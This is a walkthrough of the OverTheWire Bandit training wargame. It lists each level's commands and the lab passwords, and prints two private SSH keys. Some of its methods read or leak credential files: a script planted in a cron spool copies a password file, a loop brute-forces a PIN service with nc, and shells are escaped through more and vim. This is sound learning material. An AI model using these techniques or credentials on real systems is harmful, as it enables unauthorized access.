# Level 0
```sh
ssh bandit0@bandit.labs.overthewire.org -p 2220
# password: bandit0
```

# Level 0 → Level 1
```sh
cat readme
# nextpass boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```

# Level 1 → Level 2
```sh
ssh bandit1@bandit.labs.overthewire.org -p 2220
# password: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
cat < -
# nextpass CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```

# Bandit Level 2 → Level 3
```sh
ssh bandit2@bandit.labs.overthewire.org -p 2220
# password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
cat spaces\ in\ this\ filename
# nextpass UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
```
# Bandit Level 3 → Level 4
```sh
ssh bandit3@bandit.labs.overthewire.org -p 2220
# password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
ls
cd inhere
ls -a
cat .hidden
# nextpass pIwrPrtPN36QITSp3EQaw936yaFoFgAB
```
# Bandit Level 4 → Level 5
```sh
ssh bandit4@bandit.labs.overthewire.org -p 2220
# password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB
cd inhere
file ./*
# nextpass koReBOKuIDDepwhWk7jZC0RTdopnAYKh
```
# Bandit Level 5 → Level 6
```sh
ssh bandit5@bandit.labs.overthewire.org -p 2220
# password: koReBOKuIDDepwhWk7jZC0RTdopnAYKh
cd inhere
find ./  -size 1033c
cat ./maybehere07/.file2
# nextpass DXjZPULLxYr17uwoI01bNLQbtFemEgo7
```

# Bandit Level 6 → Level 7
```sh
ssh bandit6@bandit.labs.overthewire.org -p 2220
# password: DXjZPULLxYr17uwoI01bNLQbtFemEgo7
cd /
find / -user bandit7 -group bandit6 -size 33c 2>/dev/null
cat /var/lib/dpkg/info/bandit7.password
# nextpass HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
```
# Bandit Level 7 → Level 8
```sh
ssh bandit7@bandit.labs.overthewire.org -p 2220
# password: HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
cat data.txt |grep millionth
# nextpass: millionth	cvX2JJa4CFALtqS87jk27qwqGhBM9plV
```
# Bandit Level 8 → Level 9
```sh
ssh bandit8@bandit.labs.overthewire.org -p 2220
# password: cvX2JJa4CFALtqS87jk27qwqGhBM9plV
cat data.txt | sort | uniq -u
# nextpass: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
```
# Bandit Level 9 → Level 10
```sh
ssh bandit9@bandit.labs.overthewire.org -p 2220
# password: UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
strings data.txt | grep "==="
# nextpass: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
```
# Bandit Level 10 → Level 11
```sh
ssh bandit10@bandit.labs.overthewire.org -p 2220
# password: truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
cat data.txt | base64 -d
# nextpass: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
```
# Bandit Level 11 → Level 12
```sh
ssh bandit11@bandit.labs.overthewire.org -p 2220
# password: IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
# nextpass: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
```
# Bandit Level 12 → Level 13
```sh
ssh bandit12@bandit.labs.overthewire.org -p 2220
# password: 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
mkdir /tmp/dimas
xxd -r data.txt > /tmp/dimas/myfile1.bin
cd /tmp/dimas/
zcat myfile1.bin > myfile2
bzcat myfile2 > myfile3
zcat myfile3 > myfile4
tar -xvf myfile4
tar -xvf data5.bin
bzcat data6.bin > myfile5
zcat myfile5 > myfile6
tar -xvf myfile5
zcat data8.bin
# nextpass: 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
```
# Bandit Level 13 → Level 14
```sh
ssh bandit13@bandit.labs.overthewire.org -p 2220
8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
cat sshkey.private
```
ssh key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxkkOE83W2cOT7IWhFc9aPaaQmQDdgzuXCv+ppZHa++buSkN+
gg0tcr7Fw8NLGa5+Uzec2rEg0WmeevB13AIoYp0MZyETq46t+jk9puNwZwIt9XgB
ZufGtZEwWbFWw/vVLNwOXBe4UWStGRWzgPpEeSv5Tb1VjLZIBdGphTIK22Amz6Zb
ThMsiMnyJafEwJ/T8PQO3myS91vUHEuoOMAzoUID4kN0MEZ3+XahyK0HJVq68KsV
ObefXG1vvA3GAJ29kxJaqvRfgYnqZryWN7w3CHjNU4c/2Jkp+n8L0SnxaNA+WYA7
jiPyTF0is8uzMlYQ4l1Lzh/8/MpvhCQF8r22dwIDAQABAoIBAQC6dWBjhyEOzjeA
J3j/RWmap9M5zfJ/wb2bfidNpwbB8rsJ4sZIDZQ7XuIh4LfygoAQSS+bBw3RXvzE
pvJt3SmU8hIDuLsCjL1VnBY5pY7Bju8g8aR/3FyjyNAqx/TLfzlLYfOu7i9Jet67
xAh0tONG/u8FB5I3LAI2Vp6OviwvdWeC4nOxCthldpuPKNLA8rmMMVRTKQ+7T2VS
nXmwYckKUcUgzoVSpiNZaS0zUDypdpy2+tRH3MQa5kqN1YKjvF8RC47woOYCktsD
o3FFpGNFec9Taa3Msy+DfQQhHKZFKIL3bJDONtmrVvtYK40/yeU4aZ/HA2DQzwhe
ol1AfiEhAoGBAOnVjosBkm7sblK+n4IEwPxs8sOmhPnTDUy5WGrpSCrXOmsVIBUf
laL3ZGLx3xCIwtCnEucB9DvN2HZkupc/h6hTKUYLqXuyLD8njTrbRhLgbC9QrKrS
M1F2fSTxVqPtZDlDMwjNR04xHA/fKh8bXXyTMqOHNJTHHNhbh3McdURjAoGBANkU
1hqfnw7+aXncJ9bjysr1ZWbqOE5Nd8AFgfwaKuGTTVX2NsUQnCMWdOp+wFak40JH
PKWkJNdBG+ex0H9JNQsTK3X5PBMAS8AfX0GrKeuwKWA6erytVTqjOfLYcdp5+z9s
8DtVCxDuVsM+i4X8UqIGOlvGbtKEVokHPFXP1q/dAoGAcHg5YX7WEehCgCYTzpO+
xysX8ScM2qS6xuZ3MqUWAxUWkh7NGZvhe0sGy9iOdANzwKw7mUUFViaCMR/t54W1
GC83sOs3D7n5Mj8x3NdO8xFit7dT9a245TvaoYQ7KgmqpSg/ScKCw4c3eiLava+J
3btnJeSIU+8ZXq9XjPRpKwUCgYA7z6LiOQKxNeXH3qHXcnHok855maUj5fJNpPbY
iDkyZ8ySF8GlcFsky8Yw6fWCqfG3zDrohJ5l9JmEsBh7SadkwsZhvecQcS9t4vby
9/8X4jS0P8ibfcKS4nBP+dT81kkkg5Z5MohXBORA7VWx+ACohcDEkprsQ+w32xeD
qT1EvQKBgQDKm8ws2ByvSUVs9GjTilCajFqLJ0eVYzRPaY6f++Gv/UVfAPV4c+S0
kAWpXbv5tbkkzbS0eaLPTKgLzavXtQoTtKwrjpolHKIHUz6Wu+n4abfAIRFubOdN
/+aLoRQ0yBDRbdXMsZN/jvY44eM+xRLdRVyMmdPtP8belRi2E2aEzA==
-----END RSA PRIVATE KEY-----
```
# Bandit Level 14 → Level 15
```sh
ssh -i sshkey.private bandit14@localhost
# or
ssh -i sshkey.private bandit14@bandit.labs.overthewire.org -p 2220
cat /etc/bandit_pass/bandit14
# bandit14pass: 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
nc localhost 30000
# input bandit14pass
# nextpass: BfMYroe26WYalil77FoDi9qh59eK5xNr
```
# Bandit Level 15 → Level 16
```sh
ssh bandit15@bandit.labs.overthewire.org -p 2220
# password: BfMYroe26WYalil77FoDi9qh59eK5xNr
openssl s_client -connect localhost:30001
# input password
# nextpass: cluFn7wTiGryunymYOu4RcffSxQluehd
```
# Bandit Level 16 → Level 17
```sh
ssh bandit16@bandit.labs.overthewire.org -p 2220
# password: cluFn7wTiGryunymYOu4RcffSxQluehd
nmap -sV -T4 -p 31000-32000 localhost
openssl s_client --connect localhost:31790
# input password
```
out ssh key
```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
-----END RSA PRIVATE KEY-----
```
i save that in 
```sh
cd /tmp/random_sshkey
ssh -i private.key bandit17@localhost
cat /etc/bandit_pass/bandit17
# nextpass: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
```
# Bandit Level 17 → Level 18
```sh
ssh bandit17@bandit.labs.overthewire.org -p 2220
# password: xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn
diff passwords.new passwords.old
# nextpass: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
```
# Bandit Level 18 → Level 19
```sh
ssh bandit18@bandit.labs.overthewire.org -p 2220 -t "/bin/sh"
# password: kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd
cat readme
# nextpass: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
```
# Bandit Level 19 → Level 20
```sh
ssh bandit19@bandit.labs.overthewire.org -p 2220
# password: IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x
./bandit20-do cat /etc/bandit_pass/bandit20
# nextpass: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
```
# Bandit Level 20 → Level 21
```sh
ssh bandit20@bandit.labs.overthewire.org -p 2220
# password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -lp 1212 &
# ctrl+z
jobs
./suconnect 1212
# nextpass: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
```
# Bandit Level 21 → Level 22
```sh
ssh bandit21@bandit.labs.overthewire.org -p 2220
# password: gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr
cd /etc/cron.d
ls
cat cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
# nextpass: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
```
# Bandit Level 22 → Level 23
```sh
ssh bandit22@bandit.labs.overthewire.org -p 2220
# password: Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
cd /etc/cron.d/
ls
cat cronjob_bandit23
cat /usr/bin/cronjob_bandit23.sh
echo I am user bandit23 | md5sum | cut -d ' ' -f 1 # what is md5sum command
# output: 8ca319486bfbbc3663ea0fbe81326349
cat /tmp/8ca319486bfbbc3663ea0fbe81326349
# nextpass: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
```
# Bandit Level 23 → Level 24
```sh
ssh bandit23@bandit.labs.overthewire.org -p 2220
# password: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
cd /etc/cron.d/
cat cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
```
output:
```sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

```sh
cd /var/spool/
cd bandit24
mkdir /tmp/mytmppassbandit24/
cd /tmp/mytmppassbandit24/
touch mytmppassbandit24.txt
vi pass.sh
chmod 777 -R /tmp/mytmppassbandit24/
```

```sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/mytmppassbandit24/mytmppassbandit24.txt
```

```sh
cp pass.sh /var/spool/bandit24
# wait for the script to execute by cron
cat mytmppassbandit24.txt
# nextpass: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```
# Bandit Level 24 → Level 25
```sh
ssh bandit24@bandit.labs.overthewire.org -p 2220
# password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
mkdir /tmp/mybruteforcebandit25
cd /tmp/mybruteforcebandit25
vi brute.sh
```

```sh
password24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
for i in {0000..9999}
do
echo $password24 $i >> passlist.txt
done
cat passlist.txt | nc localhost 30002
```

```sh
bash brute.sh
# nextpass: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```
# Bandit Level 25 → Level 26
```sh
ssh bandit25@bandit.labs.overthewire.org -p 2220
# password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
cat /etc/shells
cat /usr/bin/showtext
```
output
```sh
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
```

```sh
# flatten your shell
ssh -i bandit26.sshkey bandit26@localhost
# click v to open vim
# :e /etc/bandit_pass/bandit26
# nextpass: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
```
# Bandit Level 26 → Level 27
```sh
ssh bandit26@bandit.labs.overthewire.org -p 2220
# password 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
# flatten your shell
# click v to open vim
# :set shell=/bin/bash
# :shell
ls
./bandit27-do cat /etc/bandit_pass/bandit27
# nextpass: 3ba3118a22e93127a4ed485be72ef5ea
```
# Bandit Level 27 → Level 28
```sh
ssh bandit27@bandit.labs.overthewire.org -p 2220
# password: 3ba3118a22e93127a4ed485be72ef5ea
mkdir /tmp/mypassfor27 && cd /tmp/mypassfor27
git clone ssh://bandit27-git@localhost/home/bandit27-git/repo
# password
cd repo/
ls
cat README
# nextpass: 0ef186ac70e04ea33b4c1853d2526fa2
```
# Bandit Level 28 → Level 29
```sh
ssh bandit28@bandit.labs.overthewire.org -p 2220
# password: 0ef186ac70e04ea33b4c1853d2526fa2
mkdir /tmp/mypassfor28 && cd /tmp/mypassfor28
git clone ssh://bandit28-git@localhost/home/bandit28-git/repo
# password
cd repo
git log -p # or "git log -p -1" which limits the output to only the last entry
# nextpass: bbc96594b4e001778eee9975372716b2
```
# Bandit Level 29 → Level 30
```sh
ssh bandit29@bandit.labs.overthewire.org -p 2220
# password: bbc96594b4e001778eee9975372716b2
mkdir /tmp/mypassfor29 && cd /tmp/mypassfor29
# password
cd repo/
cat README.md
```
output
```
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: <no passwords in production!>
```

```sh
git branch -a
git checkout dev
cat README.md
# nextpass: 5b90576bedb2cc04c86a9e924ce42faf
```
# Bandit Level 30 → Level 31
```sh
ssh bandit30@bandit.labs.overthewire.org -p 2220
# password: 5b90576bedb2cc04c86a9e924ce42faf
mkdir /tmp/mypassfor30 && cd /tmp/mypassfor30
git clone ssh://bandit30-git@localhost/home/bandit30-git/repo
# password
cd repo
cat README.md
git tag # Git has the ability to tag specific points in a repository’s history as being important
git show secret 
# nextpass: 47e603bb428404d265f59c42920d81e5
```
# Bandit Level 31 → Level 32
```sh
ssh bandit31@bandit.labs.overthewire.org -p 2220
# password: 47e603bb428404d265f59c42920d81e5
mkdir /tmp/mypassfor31 && cd /tmp/mypassfor31
git clone ssh://bandit31-git@localhost/home/bandit31-git/repo
# password
cd repo
cat README.md
echo "May I come in?" >> key.txt
git add key.txt -f
git commit -m "Upload a file"
git push origin master
# password
# nextpass: 56a9bf19c63d650ce78e6ec0354ee45e
```
# Bandit Level 32 → Level 33
```sh
ssh bandit32@bandit.labs.overthewire.org -p 2220
# password: 56a9bf19c63d650ce78e6ec0354ee45e
$0
cat /etc/bandit_pass/bandit33
# nextpass: c9c3199ddf4121b10cf581a98d51caee
```
# Bandit Level 33 → Level 34
```sh
ssh bandit33@bandit.labs.overthewire.org -p 2220
# password: c9c3199ddf4121b10cf581a98d51caee
ls
cat README.txt
```
output
```txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
```
